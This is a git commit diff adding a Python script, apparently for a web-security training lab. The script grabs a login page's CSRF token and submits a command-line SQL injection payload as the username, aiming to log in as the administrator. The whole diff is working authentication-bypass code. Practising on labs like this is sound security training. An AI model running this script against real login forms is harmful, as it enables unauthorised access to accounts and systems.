d28a39ab53f47a0d2159ef2f6cae57e2246f3877
emonhossain151 <ehosan151@gmail.com>
2025-03-09 22:01:10 +0600

    lab2

--- SQLi/lab_2.py
+++ SQLi/lab_2.py
@@ -1,9 +1,28 @@
 import requests
 import sys
 import urllib3
+from bs4 import BeautifulSoup
 
-# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+def get_csrf_token(session, url):
+    res = session.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    csrf = soup.find("input")['value']
+    return csrf
+
+def exploit_sqli(session, url, payload):
+    csrf = get_csrf_token(session, url)
+    data = {
+        "csrf" : csrf,
+        "username" : payload,
+        "password" : "randomtext"
+    }
+    req = session.post(url, data=data, verify=False, proxies=proxies)
+    res = req.text
+    return ("Log out" in res)
 
 
 if __name__ == '__main__':
@@ -15,3 +34,9 @@ if __name__ == '__main__':
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
         sys.exit()
 
+    session = requests.Session()
+
+    if exploit_sqli(session, url, sqli_payload):
+        print("[+] Sql injection successful! We have logged in as the administrator.")
+    else:
+        print("[-] Sql injection unsuccessful!")
